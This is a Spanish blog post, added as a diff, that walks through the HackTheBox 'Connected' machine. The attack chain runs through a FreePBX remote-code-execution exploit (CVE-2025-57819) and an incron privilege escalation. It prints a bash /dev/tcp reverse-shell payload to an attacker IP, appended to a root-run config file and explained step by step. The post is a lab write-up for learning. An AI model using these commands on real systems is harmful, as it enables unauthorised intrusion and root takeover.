@@ -1,0 +1,141 @@
+---
+title: "Writeup Connected"
+description: "Writeup de la máquina Connected de HackTheBox"
+date: "2026-08-08"
+tags: ["HackTheBox", "hacking", "fuzzing", "htb", "connected", "writeup", "john", "freepbx", "incron"]
+---
+
+[![connected](/connected_htb.png)](/connected_htb.png)
+
+## ¿Qué encontrarás aquí?
+
+- FreePBX
+- RCE
+- Incron
+- Path Hijacking
+
+## Tecnologías
+
+- Nmap
+- Gobuster
+- Exploit público
+
+## Escaneo
+
+Hacemos un escaneo agresivo para no dejarnos ningún tipo de información a descubrir.
+
+`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.129.51.87 -oN connected.txt`
+
+Encontramos tres puertos abiertos: 80, 22, 443.
+
+[![connected_nmap](/connected_nmap.png)](/connected_nmap.png)
+
+Como vemos en el escaneo hemos descubierto un vhost, así que lo añadimos a nuestro `/etc/hosts`.
+
+`echo "10.129.245.100 connected.htb" | sudo tee -a /etc/hosts`
+
+Comprobamos que el sitio web es accesible.
+
+`curl -s http://connected.htb | head -20`
+
+Y desde el navewgador vemos la web.
+
+[![connected_web](/connected_web.png)](/connected_web.png)
+
+Como vemos, es una instalación de FreePBX, un sistema de telefonía VoIP.
+
+## Fuzzing
+
+Utilizaremos Gobuster para descubrir rutas ocultas en el servidor.
+
+`gobuster dir -u http://connected.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,inc,conf,bak -t 100 -o fuzzing_results.txt`
+
+Vemos que encontramos la ruta /admin.
+
+[![connected_gobuster](/connected_gobuster.png)](/connected_gobuster.png)
+
+Visitamos dicha ruta y vemos que nos redirige a config.php, así que analizamos también esa ruta.
+
+`curl -s http://connected.htb/admin/config.php | head -100` 
+
+Pasamos el resultado a Deepseek para que lo anañice y vemos un panel de login.
+
+[![connected_login](/connected_login.png)](/connected_login.png)
+
+También nos detecta la versión de FreePBX, así que buscamos en internet posibles vulnerabilidades, y vemos que tiene esta: CVE-2025-57819, que es un RCE.
+
+Buscamos un exploit y encontramos uno en github, lo clonamos.
+
+````
+git clone https://github.com/Its1Zero/cve-2025-57819-exploit.git
+cd cve-2025-57819-exploit
+````
+Abrimos nuestero listener con `nc -lvnp 4444` y ejecutamos el exploit (las instrucciones de su usu están en su repositorio)
+
+`python3 cve-2025-57819.py connected.htb 10.10.14.44 4444` 
+
+Esperamos un poco y tendremos la rev shell  como el usuario asterisk.
+
+[![connected_asterisk](/connected_asterisk.png)](/connected_asterisk.png)
+
+## Escalada de privilegios
+
+La forma encontrada es buscando en las tareas de cron.
+
+`ps aux | grep cron` 
+
+Vemos que incron se ejecuta como root.
+
+[![connected_incron](/connected_incron.png)](/connected_incron.png)
+
+Investigamos un poco incron.
+
+`cat /etc/incron.d/*`
+
+Todas los archivos monitoreados están en `/var/spool/asterisk/sysadmin/` así que verificamos los permisos.
+
+`ls -la /var/spool/asterisk/sysadmin/` y llegamos a la conclusión de que asterisk puede escribir en cualquier archivo de este directorio.
+
+[![connected_dadi](/connected_dadi.png)](/connected_dadi.png)
+
+En la imagen se ve un `dahdi_restart` así que lo examinamos y vemos que ejecuta `/etc/init.d/dahdi restart`como root.
+
+Vamos a usar eso como vector de ataque no sin antes leer la flag de usuario con un `ls` en el directorio de asterisk.
+
+Ponemos nuestro listener `nc -lvnp 4445` y en la shell de asterisk ejecutamos el siguiente comando: `echo 'bash -c "bash -i >& /dev/tcp/10.10.14.44/4445 0>&1" &' >> /etc/dahdi/init.conf` 
+
+Explicación del payload:
+
+bash -c → Ejecuta un comando en bash.
+
+"bash -i >& /dev/tcp/10.10.14.44/4445 0>&1" → Reverse shell a nuestra IP y puerto.
+
+& → Ejecuta en segundo plano para no bloquear el script.
+
+¿Qué hace exactamente?
+
+bash -i → Inicia una shell interactiva.
+
+>& /dev/tcp/IP/PUERTO → Redirige toda la salida (stdout y stderr) a un socket TCP.
+
+0>&1 → Redirige la entrada estándar (stdin) a la salida estándar (stdout), completando la conexión.
+
+Ahora debemos activar incron para ello escribimos en el archivo dahdi_restart para desencadenar la ejecución.
+
+`echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart` 
+
+Al escribir en este archivo, incron detecta el evento IN_CLOSE_WRITE y ejecuta /usr/sbin/sysadmin_dahdi_restart como root.
+
+Y ya somos root, ahora solo queda buscar la flag.
+
+[![connected_root](/connected_root.png)](/connected_root.png)
+
+
+
+
+
+
+
+
+
+
